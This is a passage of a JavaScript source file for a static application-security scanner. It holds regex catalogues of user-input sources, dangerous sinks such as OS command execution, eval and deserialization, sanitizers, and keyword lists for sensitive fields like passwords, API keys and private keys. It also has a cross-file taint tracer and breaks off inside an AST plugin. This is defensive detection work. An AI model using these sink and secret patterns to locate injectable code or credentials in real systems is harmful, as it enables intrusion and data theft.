// Engine ported from attacksurface.html — Node ESM module.
// Theme + React UI bits stripped; browser-only deps replaced with Node equivalents.
import { transformSync as babelTransformSync } from '@babel/core';
import presetReact from '@babel/preset-react';
import presetTypescript from '@babel/preset-typescript';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';
import * as crypto from 'node:crypto';
import * as yaml from 'js-yaml';

// Disk-backed cache replacing browser sessionStorage. One JSON blob per key under ~/.claude/agentic-security/osv-cache/.
const _CACHE_DIR = path.join(os.homedir(), '.claude', 'agentic-security', 'osv-cache');
function _ensureCacheDir(){ try{ fs.mkdirSync(_CACHE_DIR,{recursive:true}); }catch(_){ } }
function _cacheKeyPath(k){ const safe = crypto.createHash('sha256').update(k).digest('hex'); return path.join(_CACHE_DIR, safe + '.json'); }
const sessionStorage = {
  getItem(k){ try{ const p=_cacheKeyPath(k); if(!fs.existsSync(p)) return null; return fs.readFileSync(p,'utf8'); }catch(_){ return null; } },
  setItem(k,v){ try{ _ensureCacheDir(); fs.writeFileSync(_cacheKeyPath(k), v); }catch(_){ } },
};
// localStorage shim (engine references it inside string regex patterns only — never reads from it at runtime).
const localStorage = sessionStorage;
const DATA_CLASSES={PII:{label:"PII",color:"#c792ea",patterns:["fname","lname","first_name","last_name","surname","full_name","dob","date_of_birth","ssn","social_security","tax_id","national_id","address_line","postal_code","zip_code","home_address","phone","mobile","email","drivers_license","passport_no","voter_id","geolocation","fingerprint","voice_print","dna_sequence","student_id","salary"]},PHI:{label:"PHI",color:"#ff6b9d",patterns:["ehr_id","mrn","medical_record_number","patient_id","patient_name","diagnosis","icd_code","cpt_code","prescription","blood_type","pregnancy_status","disability","mental_health","medical_history","treatment_plan","lab_result","medication","immunization","insurance_plan","policy_number","hipaa","phi"]},PCI:{label:"PCI",color:"#ff6b35",patterns:["pan","credit_card","card_number","cc_num","cardholder_name","cvv","cvc","cvv2","security_code","card_verification","exp_date","card_expiry","track_1","track_2","magstripe","pin_block","routing_number","bank_account","iban","swift_code","account_number"]},Confidential:{label:"Confidential",color:"#ffb800",patterns:["top_secret","secret","confidential","classified","cui","controlled","attorney_client","privileged","trade_secret","proprietary","internal_use_only","do_not_distribute","export_controlled","itar","cjis","password","passwd","api_key","secret_key","access_token","auth_token","connection_string","private_key"]}};
function classifyField(n){const l=n.toLowerCase().replace(/[-\s]/g,"_");const m=[];for(const[c,info]of Object.entries(DATA_CLASSES))for(const p of info.patterns)if(l.includes(p)){m.push(c);break;}return m;}
function classifyEndpoint(fields){const c=new Set();for(const f of fields)for(const x of classifyField(f))c.add(x);return[...c];}
function stripNoise(code){let c=code.replace(/\/\*[\s\S]*?\*\//g,m=>m.replace(/[^\n]/g,' '));c=c.replace(/\/\/[^\n]*/g,m=>' '.repeat(m.length));return c;}
function detectMiddlewareAuth(content){const a=[];const re=/(?:app|router)\s*\.\s*use\s*\(\s*(?:['"]\/[^'"]*['"]\s*,\s*)?(?:authenticate|auth|isAuthenticated|requireAuth|passport\.authenticate|verifyToken|authMiddleware|checkAuth|protect|jwt)/gi;let m;while((m=re.exec(content)))a.push({line:content.substring(0,m.index).split("\n").length,scope:m[0].includes("/")?m[0].match(/['"]([^'"]+)['"]/)?.[1]||"/":"/"});return a;}
function buildImportGraph(fc){const g={},ex={};for(const[fp,content]of Object.entries(fc)){g[fp]=[];ex[fp]=[];let m;const rr=/(?:const|let|var)\s*(?:\{([^}]+)\}|(\w+))\s*=\s*require\s*\(\s*['"]([^'"]+)['"]\s*\)/g;while((m=rr.exec(content)))g[fp].push({source:m[3],names:m[1]?m[1].split(",").map(s=>s.trim().split(/\s+as\s+/).pop().trim()):m[2]?[m[2]]:[]});const ir=/import\s+(?:\{([^}]+)\}|(\w+))\s+from\s+['"]([^'"]+)['"]/g;while((m=ir.exec(content)))g[fp].push({source:m[3],names:m[1]?m[1].split(",").map(s=>s.trim().split(/\s+as\s+/).pop().trim()):m[2]?[m[2]]:[]});}return{graph:g,exports:ex};}
function resolveImport(from,imp,all){
  if(!imp.startsWith("."))return null;
  const dir=from.split("/").slice(0,-1).join("/");
  // Feat-3 fix: when `from` is top-level, dir is "" — joining with "/" produces
  // "/lib.js" while the fileContents key is "lib.js". Skip the leading slash
  // and resolve `..` / `.` segments cleanly.
  const base=imp.replace(/^\.\//,"");
  let r=dir?(dir+"/"+base):base;
  const parts=r.split("/").filter(Boolean);
  const out=[];
  for(const p of parts){if(p==="..")out.pop();else if(p!==".")out.push(p);}
  r=out.join("/");
  for(const e of ["",".js",".ts",".jsx",".tsx","/index.js"])if(all.includes(r+e))return r+e;
  return null;
}
function crossFileTaint(pfr,fc,ii){
  // Feat-3: deepened cross-file BFS (up to 5 hops, was 3) with explicit
  // `chain` field on each finding showing the full file:line propagation path.
  // Catches chains like: routes/A → lib/B → lib/C → lib/D → models/E.
  const{graph}=ii;const all=Object.keys(fc);const cf=[];
  function traceHop(srcFile,srcInfo,visitedFiles,hopPath){
    if(visitedFiles.size>=5)return;
    const imports=graph[srcFile]||[];
    for(const imp of imports){
      const pF=resolveImport(srcFile,imp.source,all);
      if(!pF||visitedFiles.has(pF))continue;
      const pr=pfr[pF];if(!pr)continue;
      const fileContent=fc[srcFile];const fileLines=fileContent.split("\n");
      for(const iN of imp.names){
        if(!iN||iN.length<2)continue;
        let safeVar=srcInfo.variable.replace(/[.*+?^${}()|[\]\\]/g,'\\$&');
        const re=new RegExp(iN+"\\s*\\([^)]*\\b"+safeVar+"\\b[^)]*\\)","g");
        let cm;while((cm=re.exec(fileContent))){
          const cl=fileContent.substring(0,cm.index).split("\n").length;
          const hopStep={type:"propagation",label:"Passed to "+iN+"() in "+pF.split("/").pop(),line:cl,snippet:fileLines[cl-1]?.trim()||""};
          // Record findings for sinks in the imported file
          for(const sink of pr.sinks){
            const id="xf:"+srcFile+":"+srcInfo.line+":"+pF+":"+sink.line;
            if(!cf.find(f=>f.id===id)){
              const fullPath=[...hopPath,hopStep,{type:"sink",label:sink.type+" in "+pF.split("/").pop()+":"+sink.line,line:sink.line,snippet:sink.snippet}];
              const chain=fullPath.map(s=>({type:s.type,file:s.label||'',line:s.line||0,snippet:s.snippet||''}));
              cf.push({id,source:srcInfo,sink,
                path:fullPath,
                chain,
                hopCount:visitedFiles.size,
                isSanitized:false,severity:sink.severity,vuln:sink.vuln,cwe:sink.cwe,stride:sink.stride,
                file:srcFile+" -> "+pF,isCrossFile:true,parser:pr.parser});
            }
          }
          // Recurse: follow the call chain deeper into pF's own imports
          const newVisited=new Set(visitedFiles);newVisited.add(pF);
          for(const pSrc of pr.sources){
            if(!pSrc.variable)continue;
            traceHop(pF,pSrc,newVisited,[...hopPath,hopStep]);
          }
        }
      }
    }
  }
  for(const[cF,cr]of Object.entries(pfr)){
    if(!cr)continue;
    for(const src of cr.sources){
      if(!src.variable)continue;
      const startSnippet=fc[cF]?.split("\n")[src.line-1]?.trim()||"";
      traceHop(cF,src,new Set([cF]),[{type:"source",label:"Input: "+src.label,line:src.line,snippet:startSnippet}]);
    }
  }
  return cf;}

const SOURCE_PATTERNS=[{regex:/(?:req|request)\s*\.\s*(files|file)\s*(?:\.\s*(\w+)|\[\s*['"]?(\w+)['"]?\s*\])?/g,category:"File Upload",getLabel:m=>`req.${m[1]}.${m[2]||m[3]||"*"}`,inputType:m=>m[1]},{regex:/(?:req|request)\s*\.\s*body(?!\s*\.)/g,category:"HTTP Body (Whole)",getLabel:()=>"req.body",inputType:()=>"body"},{regex:/document\s*\.\s*(cookie|URL|referrer|location\.(?:search|hash|href))/g,category:"DOM Source",getLabel:m=>`document.${m[1]}`,inputType:()=>"dom"},{regex:/(?:window|self)\s*\.\s*name/g,category:"DOM Source",getLabel:()=>"window.name",inputType:()=>"dom"},{regex:/URLSearchParams\s*\.\s*get\s*\(|new\s+URLSearchParams\s*\(/g,category:"URL Params",getLabel:()=>"URLSearchParams",inputType:()=>"url"},{regex:/(?:event|e)\s*\.\s*(?:data|target\.value|currentTarget\.value)/g,category:"Event Data",getLabel:m=>`event.${m[0].split(".").pop()}`,inputType:()=>"event"},{regex:/(?:req|request)\s*\.\s*(query|params|body|headers|cookies)\s*(?:\.\s*(\w+)|\[\s*['"](\w+)['"]\s*\])/g,category:"HTTP Input",getLabel:m=>`req.${m[1]}.${m[2]||m[3]}`,inputType:m=>m[1]},{regex:/\$_(?:GET|POST|REQUEST|COOKIE|FILES|SERVER)\s*\[\s*['"](\w+)['"]\s*\]/g,category:"PHP Superglobal",getLabel:m=>m[0].trim(),inputType:()=>"http"},{regex:/request\s*\.\s*(?:GET|POST|args|form|json|data|files)\s*(?:\.\s*get\s*\(\s*['"](\w+)['"]|\.(\w+))/g,category:"Python Input",getLabel:m=>`request.${m[1]||m[2]}`,inputType:()=>"http"},{regex:/params\s*\[\s*:(\w+)\s*\]/g,category:"Rails Params",getLabel:m=>`params[:${m[1]}]`,inputType:()=>"http"},{regex:/ctx\s*\.\s*(query|params|request\.body)\s*\.\s*(\w+)/g,category:"Koa Input",getLabel:m=>`ctx.${m[1]}.${m[2]}`,inputType:()=>"http"},{regex:/c\s*\.\s*(Query|Param|FormValue|GetHeader)\s*\(\s*['"](\w+)['"]\s*\)/g,category:"Go Input",getLabel:m=>`c.${m[1]}("${m[2]}")`,inputType:()=>"http"},{regex:/<input\b[^>]*name\s*=\s*["'](\w+)["'][^>]*>/gi,category:"Form Input",getLabel:m=>`<input name="${m[1]}">`,inputType:()=>"form"},{regex:/window\.location\s*\.\s*(search|hash|href|pathname)/g,category:"URL Input",getLabel:m=>`window.location.${m[1]}`,inputType:()=>"url"},
// Django FILES / META headers
{regex:/request\s*\.\s*(?:FILES|META)\s*(?:\[\s*['"]([^'"]+)['"]\s*\]|\.get\s*\(\s*['"]([^'"]+)['"]\))/g,category:"Django Input",getLabel:m=>`request.${m[1]||m[2]}`,inputType:()=>"http"},
// FastAPI / Starlette path_params
{regex:/request\s*\.\s*path_params\s*(?:\[\s*['"](\w+)['"]\s*\]|\.get\s*\(\s*['"](\w+)['"]\))/g,category:"FastAPI Path Param",getLabel:m=>`request.path_params["${m[1]||m[2]}"]`,inputType:()=>"path"},
// Go stdlib net/http — r.FormValue, r.PostFormValue, r.URL.RawQuery, r.Header.Get
{regex:/r\s*\.\s*(?:FormValue|PostFormValue)\s*\(\s*['"](\w+)['"]\s*\)/g,category:"Go Form Input",getLabel:m=>`r.FormValue("${m[1]}")`,inputType:()=>"form"},
{regex:/r\s*\.\s*URL\s*\.\s*(?:RawQuery|Query\s*\(\s*\))/g,category:"Go URL Input",getLabel:()=>"r.URL.RawQuery",inputType:()=>"url"},
{regex:/r\s*\.\s*Header\s*\.\s*Get\s*\(\s*['"]([^'"]+)['"]\s*\)/g,category:"Go Header Input",getLabel:m=>`r.Header.Get("${m[1]}")`,inputType:()=>"header"},
// Echo framework
{regex:/c\s*\.\s*(?:Param|QueryParam|FormValue|GetHeader)\s*\(\s*['"](\w+)['"]\s*\)/g,category:"Echo Input",getLabel:m=>`c.${m[0].match(/\.(\w+)\s*\(/)[1]}("${m[1]}")`,inputType:()=>"http"},
// Chi URL params
{regex:/chi\s*\.\s*URLParam\s*\(\s*\w+\s*,\s*['"](\w+)['"]\s*\)/g,category:"Chi Path Param",getLabel:m=>`chi.URLParam("${m[1]}")`,inputType:()=>"path"},
// PHP extract() / parse_str() variable injection
{regex:/extract\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)\s*\)/g,category:"PHP Variable Extract",getLabel:()=>"extract($_REQUEST)",inputType:()=>"http"},
{regex:/parse_str\s*\([^,)]+,\s*\$(\w+)\s*\)/g,category:"PHP parse_str",getLabel:m=>`parse_str→\$${m[1]}`,inputType:()=>"http"},
// JavaScript localStorage / sessionStorage reads
{regex:/(?:localStorage|sessionStorage)\s*\.\s*getItem\s*\(\s*['"](\w+)['"]\s*\)/g,category:"Client Storage Read",getLabel:m=>`${m[0].split('.')[0]}.getItem("${m[1]}")`,inputType:()=>"storage"},
// postMessage data (cross-origin messaging)
{regex:/(?:event|e|msg)\s*\.\s*data(?:\s*\.\s*\w+)?\b/g,category:"PostMessage Data",getLabel:()=>"event.data",inputType:()=>"message"},
// Java Spring MVC — @RequestParam, @PathVariable, @RequestBody annotations
{regex:/@(?:RequestParam|PathVariable|RequestBody|RequestHeader|CookieValue)\s*(?:\([^)]*\))?\s+\w[\w<>[\]]*\s+(\w+)/g,category:"Spring HTTP Input",getLabel:m=>`@${m[0].match(/@(\w+)/)[1]}: ${m[1]}`,inputType:()=>"http"},
// Tornado web framework
{regex:/self\s*\.\s*get_(?:argument|body_argument|query_argument)\s*\(\s*['"](\w+)['"]/g,category:"Tornado Input",getLabel:m=>`self.get_argument("${m[1]}")`,inputType:()=>"http"},
// Ruby ARGV / request.path_parameters / query_string
{regex:/(?:\bARGV\b|request\s*\.\s*(?:path_parameters|query_string))/g,category:"Ruby Input",getLabel:m=>m[0].trim(),inputType:()=>"http"}];
const SINK_PATTERNS=[{regex:/(?:db|database|collection|model|query|cursor|session|knex|sequelize|prisma|mongoose)\s*\.\s*(?:execute|query|find|findOne|findAll|insert|update|delete|save|create|remove|aggregate|raw|where)\s*\(/g,type:"Database Query",severity:"high",vuln:"SQL Injection",cwe:"CWE-89",stride:"Tampering"},{regex:/(?:innerHTML|outerHTML)\s*=/g,type:"DOM Write",severity:"critical",vuln:"XSS",cwe:"CWE-79",stride:"Tampering"},{regex:/dangerouslySetInnerHTML/g,type:"React Unsafe HTML",severity:"critical",vuln:"XSS",cwe:"CWE-79",stride:"Tampering"},{regex:/(?:exec|spawn|execSync|system|popen|subprocess\.(?:call|run|Popen)|child_process|shell_exec|passthru)\s*\(/g,type:"OS Command",severity:"critical",vuln:"Command Injection",cwe:"CWE-78",stride:"Elevation of Privilege"},{regex:/(?:res\.redirect|redirect|header\s*\(\s*['"]Location)/g,type:"Redirect",severity:"medium",vuln:"Open Redirect",cwe:"CWE-601",stride:"Spoofing"},{regex:/(?:readFile|writeFile|createReadStream|unlink|fopen|file_get_contents)\s*\(/g,type:"File Op",severity:"high",vuln:"Path Traversal",cwe:"CWE-22",stride:"Information Disclosure"},{regex:/(?:eval|new\s+Function)\s*\(/g,type:"Code Eval",severity:"critical",vuln:"Code Injection",cwe:"CWE-94",stride:"Elevation of Privilege"},{regex:/(?:res\.send|res\.write|res\.end|echo|print)\s*\(/g,type:"HTTP Response",severity:"medium",vuln:"Reflected XSS",cwe:"CWE-79",stride:"Tampering"},{regex:/(?:\.render)\s*\(\s*['"][^'"]+['"]\s*,/g,type:"Template Render",severity:"medium",vuln:"SSTI",cwe:"CWE-1336",stride:"Elevation of Privilege"},{regex:/(?:pickle\.loads|yaml\.unsafe_load|unserialize)\s*\(/g,type:"Deserialization",severity:"critical",vuln:"Insecure Deserialization",cwe:"CWE-502",stride:"Elevation of Privilege"},{regex:/(?:fetch|axios|http\.request|requests\.(?:get|post|put|delete))\s*\(/g,type:"Outbound HTTP",severity:"high",vuln:"SSRF",cwe:"CWE-918",stride:"Spoofing"},{regex:/(?:localStorage|sessionStorage)\s*\.\s*setItem\s*\(/g,type:"Client Storage",severity:"medium",vuln:"Data Exposure",cwe:"CWE-922",stride:"Information Disclosure"},{regex:/(?:Object\.assign|_\.assign|_\.merge|_\.extend)\s*\([^,]+,/g,type:"Object Merge",severity:"high",vuln:"Mass Assignment",cwe:"CWE-915",stride:"Tampering"},{regex:/\.\s*(?:create|update|save|build)\s*\(\s*(?:req\.body|request\.data|ctx\.request\.body|\{[^}]*\.\.\.)/g,type:"Model Write",severity:"high",vuln:"Mass Assignment",cwe:"CWE-915",stride:"Tampering"},{regex:/(?:findById|findByPk|get_object_or_404)\s*\(/g,type:"Direct Lookup",severity:"high",vuln:"IDOR",cwe:"CWE-639",stride:"Tampering"},{regex:/\.(?:findOne|findFirst)\s*\(\s*\{[^}]*(?:_id|id)\s*:/g,type:"ID Lookup",severity:"high",vuln:"IDOR",cwe:"CWE-639",stride:"Tampering"},{regex:/\.(?:updateOne|deleteOne|findOneAndUpdate|findOneAndDelete|findByIdAndUpdate|findByIdAndDelete|destroy)\s*\(/g,type:"ID Mutation",severity:"critical",vuln:"IDOR",cwe:"CWE-639",stride:"Tampering"},{regex:/(?:_\.merge|_\.defaultsDeep|_\.setWith|_\.set)\s*\(/g,type:"Prototype Pollution (lodash)",severity:"critical",vuln:"Prototype Pollution",cwe:"CWE-1321",stride:"Tampering"},{regex:/(?:merge|deepMerge|deepExtend|defaultsDeep)\s*\([^,]+,/g,type:"Deep Merge",severity:"high",vuln:"Prototype Pollution",cwe:"CWE-1321",stride:"Tampering"},{regex:/\$\s*\.\s*(?:html|append|prepend|after|before)\s*\(/g,type:"jQuery DOM (CVE-2020-11022)",severity:"high",vuln:"XSS (Supply Chain)",cwe:"CWE-79",stride:"Tampering"},{regex:/yaml\s*\.\s*safe_load\s*\(/g,type:"YAML SafeLoad",severity:"info",vuln:"Safe YAML",cwe:"",stride:""},{regex:/new\s+RegExp\s*\([^)]*(?:req\.|request\.|params|query|body|input|user)/g,type:"Dynamic RegExp",severity:"high",vuln:"ReDoS",cwe:"CWE-1333",stride:"Denial of Service"},{regex:/jsonwebtoken\s*\.\s*verify\s*\([^,]+,[^,]*(?:algorithms|algorithm)/g,type:"JWT Verify",severity:"info",vuln:"Safe JWT",cwe:"",stride:""},{regex:/(?:jwt\.verify|jsonwebtoken\.verify)\s*\(\s*[^,]+,\s*[^,{]+\s*\)/g,type:"JWT Verify (no algo)",severity:"high",vuln:"JWT Algorithm Confusion",cwe:"CWE-327",stride:"Spoofing"},{regex:/(?:vm\.runInContext|vm\.runInNewContext|vm\.runInThisContext|new\s+vm\.Script)\s*\(/g,type:"VM Sandbox",severity:"critical",vuln:"RCE (VM Sandbox Escape)",cwe:"CWE-94",stride:"Elevation of Privilege"},{regex:/crypto\.createHash\s*\(\s*['"](?:md5|sha1|md4)['"]/gi,type:"Weak Hash",severity:"high",vuln:"Weak Cryptography",cwe:"CWE-916",stride:"Information Disclosure"},{regex:/bypassSecurityTrust(?:Html|Script|Style|Url|ResourceUrl)\s*\(/g,type:"Angular Trust Bypass",severity:"critical",vuln:"XSS (Angular DomSanitizer Bypass)",cwe:"CWE-79",stride:"Tampering"},{regex:/nativeElement\s*\.\s*innerHTML\s*=/g,type:"Angular DOM Write",severity:"critical",vuln:"XSS (Angular innerHTML)",cwe:"CWE-79",stride:"Tampering"},{regex:/(?:res\.setHeader|res\.set)\s*\(\s*['"][^'"]+['"]\s*,/g,type:"Header Injection",severity:"medium",vuln:"Header Injection",cwe:"CWE-113",stride:"Tampering"},{regex:/child_process\s*\.\s*fork\s*\(/g,type:"Process Fork",severity:"critical",vuln:"Command Injection (fork)",cwe:"CWE-78",stride:"Elevation of Privilege"},{regex:/(?:\{|,)\s*\$(?:where|regex|gt|lt|gte|lte|ne|in|nin|or|and|not|nor|exists|type|mod|text|near|within)\s*:/g,type:"NoSQL Operator",severity:"high",vuln:"NoSQL Injection",cwe:"CWE-943",stride:"Tampering",contextRe:/(?:\.find|\.findOne|\.findOneAndUpdate|\.updateOne|\.updateMany|\.deleteOne|\.deleteMany|\.aggregate|\.countDocuments|\.distinct|Model\.\w+)\s*\(/, langScope:/\.(?:js|jsx|ts|tsx|mjs|cjs|java|py)$/i},{regex:/(?:pug|jade|ejs|nunjucks|swig|dot|twig|mustache|handlebars)\.(?:compile|render|renderFile)\s*\(/g,type:"Template Engine",severity:"high",vuln:"Server-Side Template Injection",cwe:"CWE-1336",stride:"Elevation of Privilege"},{regex:/res\.(?:setHeader|set)\s*\([^;)]*(?:\\r\\n|\\n|%0[aAdD])/g,type:"Response Splitting",severity:"medium",vuln:"HTTP Response Splitting",cwe:"CWE-113",stride:"Tampering"},{regex:/Object\.(?:defineProperty|setPrototypeOf)\s*\([^,)]*(?:req\.|body\.|query\.)/g,type:"Proto Manipulation",severity:"critical",vuln:"Prototype Pollution via Object.defineProperty",cwe:"CWE-1321",stride:"Tampering"},{regex:/jwt\s*\.\s*sign\s*\([^,)]*(?:req\.|body\.|query\.)/g,type:"JWT Sign with User Data",severity:"high",vuln:"JWT Forged Payload (User-Controlled Claims)",cwe:"CWE-347",stride:"Spoofing"},{regex:/res\s*\.\s*json\s*\([^;)]*(?:findAll|findAndCountAll|find\s*\(|\$queryInterface)\s*\(/g,type:"Bulk Data Exposure",severity:"high",vuln:"Unrestricted Data Exposure via API",cwe:"CWE-200",stride:"Information Disclosure"},
// Ruby dynamic method dispatch — send()/public_send() with variable method name
{regex:/\.\s*(?:send|public_send)\s*\(\s*(?!['"`])\w/g,type:"Dynamic Dispatch",severity:"critical",vuln:"Unsafe Reflection / RCE",cwe:"CWE-470",stride:"Elevation of Privilege"},
// Ruby eval variants
{regex:/(?:eval|instance_eval|class_eval|module_eval)\s*\(/g,type:"Ruby Eval",severity:"critical",vuln:"Code Injection",cwe:"CWE-94",stride:"Elevation of Privilege"},
// Ruby ERB template injection
{regex:/ERB\s*\.\s*new\s*\(\s*(?!['"`])[^)]+\)\s*\.\s*result/g,type:"ERB Template",severity:"critical",vuln:"SSTI",cwe:"CWE-1336",stride:"Elevation of Privilege"},
// Django / Python SSTI — Template(user_code).render(...)
{regex:/Template\s*\(\s*(?!['"`])[^)]+\)\s*\.\s*render\s*\(/g,type:"Django Template",severity:"critical",vuln:"SSTI",cwe:"CWE-1336",stride:"Elevation of Privilege"},
// PHP dynamic file inclusion
{regex:/(?:include|require|include_once|require_once)\s*\(\s*\$(?:\w+|\{[^}]+\})/g,type:"File Inclusion",severity:"critical",vuln:"Local File Inclusion",cwe:"CWE-98",stride:"Elevation of Privilege"},
// PHP mail() header injection
{regex:/mail\s*\(\s*\$[^,]+,\s*\$[^,]+,\s*\$[^,]+,\s*\$/g,type:"Mail Headers",severity:"high",vuln:"Email Header Injection",cwe:"CWE-93",stride:"Spoofing"},
// Laravel raw SQL helpers
{regex:/DB\s*::\s*(?:raw|statement|unprepared)\s*\(/g,type:"Laravel Raw SQL",severity:"high",vuln:"SQL Injection",cwe:"CWE-89",stride:"Tampering"},
{regex:/\.\s*(?:whereRaw|selectRaw|havingRaw|orderByRaw|groupByRaw|fromRaw)\s*\(/g,type:"Laravel Raw Clause",severity:"high",vuln:"SQL Injection",cwe:"CWE-89",stride:"Tampering"},
// GORM raw queries (Go)
{regex:/(?:db|DB|gorm)\s*\.\s*(?:Raw|Exec)\s*\(\s*["'`][^"'`]*\+/g,type:"GORM Raw SQL",severity:"high",vuln:"SQL Injection",cwe:"CWE-89",stride:"Tampering"},
// Go format string sinks
{regex:/(?:fmt|log)\s*\.\s*(?:Fprintf|Printf|Sprintf|Errorf|Fatalf|Panicf)\s*\(/g,type:"Format String",severity:"high",vuln:"Format String Injection",cwe:"CWE-134",stride:"Information Disclosure"},
// Java JDBC / Hibernate / JPA raw queries
{regex:/(?:statement|stmt|conn|connection|session|em|entityManager)\s*\.\s*(?:executeQuery|executeUpdate|execute|createNativeQuery|createQuery)\s*\(/g,type:"Java SQL",severity:"high",vuln:"SQL Injection",cwe:"CWE-89",stride:"Tampering"},
// Java Runtime.exec() / ProcessBuilder
{regex:/(?:Runtime\s*\.\s*getRuntime\s*\(\s*\)\s*\.\s*exec|new\s+ProcessBuilder)\s*\(/g,type:"Java OS Command",severity:"critical",vuln:"Command Injection",cwe:"CWE-78",stride:"Elevation of Privilege"}];
const SANITIZER_PATTERNS=[{regex:/(?:escape|escapeHtml|htmlspecialchars|encodeURIComponent|sanitize|DOMPurify\.sanitize|strip_tags|bleach\.clean)\s*\(/gi,type:"Output Encoding"},{regex:/(?:validator|validate|isValid|Joi\.|yup\.|zod\.)\s*[\.(]/gi,type:"Input Validation"},{regex:/(?:parameterize|prepare|bindParam|bindValue)\s*/gi,type:"Parameterized Query"},{regex:/(?:parseInt|parseFloat|Number)\s*\(/g,type:"Type Casting"},{regex:/(?:helmet|csrf|rate.?limit)\s*[\.(]/gi,type:"Security Middleware"},{regex:/(?:bcrypt|argon2)\.(?:hash|compare)\s*\(/gi,type:"Crypto Hash"},{regex:/yaml\s*\.\s*safe_load|SafeLoader|yaml\.load\s*\([^)]*Loader/gi,type:"Safe YAML"},{regex:/DOMPurify\.sanitize\s*\(\s*marked/gi,type:"Sanitized Markdown"},{regex:/(?:__proto__|constructor|prototype)\s*.*(?:continue|delete|throw|return|filter|reject|block)/gi,type:"Proto Key Filter"},{regex:/algorithms\s*:\s*\[/gi,type:"JWT Algo Pinning"},{regex:/\.text\s*\(/g,type:"Safe DOM (text)"},
// Pydantic — model validation (Python)
{regex:/(?:BaseModel|model_validate|\.model_validate\s*\(|Field\s*\()/g,type:"Pydantic Validation"},
// Django form / model form validation
{regex:/\.is_valid\s*\(\s*\)|cleaned_data\b|clean_\w+\s*\(\s*self\s*\)/g,type:"Django Form Validation"},
// Python stdlib html.escape
{regex:/html\s*\.\s*escape\s*\(/g,type:"Python HTML Escape"},
// PHP htmlentities / htmlspecialchars_decode safety check
{regex:/htmlentities\s*\(/gi,type:"PHP HTML Encode"},
// Go html.EscapeString
{regex:/html\s*\.\s*EscapeString\s*\(/g,type:"Go HTML Escape"},
// sanitize-html / xss npm packages
{regex:/(?:sanitizeHtml|xss)\s*\(/g,type:"HTML Sanitizer (npm)"},
// Rails strong parameters
{regex:/\.permit\s*\(/g,type:"Rails Strong Params"},
// Spring / Jakarta Bean Validation annotations
{regex:/@(?:Valid|Validated|NotNull|NotBlank|NotEmpty|Size|Min|Max|Pattern|Email)\b/g,type:"Spring Bean Validation"},
// Marshmallow schema validation (Python)
{regex:/(?:Schema\s*\(\s*\)|\.load\s*\(|\.loads\s*\()/gi,type:"Marshmallow Validation"},
// Type coercion — Python int()/float()/str()
{regex:/\b(?:int|float|str|bool)\s*\(\s*(?!0\b|1\b|True|False)/g,type:"Python Type Cast"},
// path.resolve / os.path.abspath with subsequent startswith check (path traversal guard)
{regex:/(?:path\.resolve|os\.path\.(?:abspath|realpath)|filepath\.Clean)\s*\(/g,type:"Path Normalisation"},
// re.escape / preg_quote / Regexp.escape
{regex:/(?:re\.escape|preg_quote|Regexp\.escape)\s*\(/g,type:"Regex Escaping"}];
const ROUTE_PATTERNS=[{regex:/(?:app|router)\s*\.\s*(get|post|put|patch|delete|all|options|head)\s*\(\s*['"`]([^'"`]+)['"`]/g,fw:"Express",mI:1,pI:2},{regex:/@(?:app|blueprint|bp)\s*\.\s*route\s*\(\s*['"]([^'"]+)['"]\s*(?:,\s*methods\s*=\s*\[([^\]]+)\])?/g,fw:"Flask",pI:1,mtI:2},{regex:/path\s*\(\s*['"]([^'"]+)['"]/g,fw:"Django",pI:1},{regex:/@(?:app|router)\s*\.\s*(get|post|put|patch|delete)\s*\(\s*['"]([^'"]+)['"]/g,fw:"FastAPI",mI:1,pI:2},{regex:/Route\s*::\s*(get|post|put|patch|delete|any)\s*\(\s*['"]([^'"]+)['"]/g,fw:"Laravel",mI:1,pI:2},{regex:/router\s*\.\s*(get|post|put|patch|delete)\s*\(\s*['"]([^'"]+)['"]/g,fw:"Koa/Express",mI:1,pI:2},{regex:/\[Http(Get|Post|Put|Delete|Patch)\s*\(\s*["']?([^"'\]]*)/g,fw:"ASP.NET",mI:1,pI:2},{regex:/['"`](\/api\/[a-zA-Z0-9\/:_\-{}]+)['"`]/g,fw:"API",pI:1}];
const AUTH_PATTERNS=[/(?:authenticate|isAuthenticated|requireAuth|passport\.authenticate|jwt\.verify|verifyToken|authMiddleware|checkAuth|protect|authorize)\s*[\(,]/gi,/(?:middleware|use)\s*\(\s*(?:auth|jwt|token|session)/gi,/(?:isAuthorized|expressJwt|security\.isAuthorized|denyAll)\s*[\(]/gi,/passport\.(?:authenticate|initialize|session)\s*\(/gi];
const IGNORE_DIRS=new Set(["node_modules",".git","__pycache__","vendor","dist","build",".next","venv","env",".venv","target","bin","obj",".cache","coverage","bower_components","tests","test","__tests__","spec","mocks"]);
const CODE_EXTS=new Set(["js","jsx","ts","tsx","mjs","cjs","py","rb","php","java","go","cs","rs","vue","svelte","html","htm","ejs","hbs","pug","erb","twig","graphql","gql","kt","scala","swift","dart","ex","exs","tf","tfvars","dockerfile"]);
// Feat-2: IaC manifest filenames that aren't extension-based.
const IAC_FILENAMES = new Set(['Dockerfile', 'Containerfile', 'docker-compose.yml', 'docker-compose.yaml', 'Chart.yaml']);
function _isIaCFile(p){
  const base = p.split('/').pop() || p;
  if (IAC_FILENAMES.has(base)) return true;
  if (/\.dockerfile$/i.test(base)) return true;
  if (/\.tf$|\.tfvars$/i.test(base)) return true;
  // K8s YAML heuristic: under k8s/ or contains "kind:" — caller checks content
  if (/(?:^|\/)k8s(?:\/|$)/.test(p) && /\.ya?ml$/i.test(base)) return true;
  if (/(?:^|\/)\.github\/workflows\/.*\.ya?ml$/.test(p)) return true;
  if (/(?:^|\/)\.gitlab-ci\.ya?ml$/.test(p)) return true;
  if (/(?:^|\/)values\.ya?ml$/.test(p)) return true;
  return false;
}
function getExt(n){const p=n.split(".");return p.length>1?p.pop().toLowerCase():"";}
function shouldScan(p){if(/\.(test|spec|mock)\./i.test(p))return false;if(/\.min\.[mc]?js$/i.test(p))return false;for(const x of p.split("/"))if(IGNORE_DIRS.has(x))return false;return CODE_EXTS.has(getExt(p)) || _isIaCFile(p);}
function lineAt(c,i){return c.substring(0,i).split("\n").length;}


/* === WORLD CLASS FEATURE: AST-BASED TAINT TRACKING WITH DEEP CONTEXT === */
function performASTAnalysis(fp, code) {
    const findings = [], sources = [], sinks = [], sanitizers = [];
    const lines = code.split('\n');

    const astTaintTrackerPlugin = function({ types: t }) {
        return {
            visitor: {
                // Fix 1: Detect TypeScript destructured request params
                // Catches: ({ body, params, query, headers, cookies }: Request, res, next) => { ... }
